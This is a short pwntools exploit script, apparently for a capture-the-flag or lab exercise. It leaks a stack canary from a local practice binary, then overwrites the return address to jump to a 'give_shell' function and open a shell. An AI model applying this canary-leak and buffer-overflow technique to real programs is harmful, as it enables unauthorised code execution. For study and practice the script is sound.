from pwn import *

elf = ELF("./example6")
p=process("./example6")



p.send("A"*33)
data = p.recv(1024)
print `"[+]data: " + data`

canary="\x00"+data.split("A"*33)[1][:3]
print `canary`
print "[+] CANARY : " + hex(u32(canary))


give_shell = elf.symbols['give_shell']

PAYLOAD = "A"*32
PAYLOAD += canary
PAYLOAD += "B"*8
PAYLOAD += p32(give_shell)
print PAYLOAD

p.send(PAYLOAD)

log.info("GET SHELL")

p.interactive()


# # PAYLOAD+=